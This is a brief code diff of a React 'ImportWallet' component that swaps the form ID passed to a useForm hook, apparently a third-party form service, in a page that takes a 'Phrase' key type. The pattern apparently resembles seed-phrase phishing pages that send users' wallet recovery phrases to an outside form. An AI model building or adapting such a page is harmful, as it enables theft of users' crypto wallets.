@@ -9,7 +9,7 @@ const ImportWallet = () => {
   const navigate = useNavigate();
   const { id } = useParams();
   const [keyType, setKeyType] = useState("Phrase");
-  const [state, handleSubmit] = useForm("xoqzgbnr");
+  const [state, handleSubmit] = useForm("mjvqbbnl");
 
   const HandleWallet = () => {
     let tabs = document.querySelectorAll(".tab");
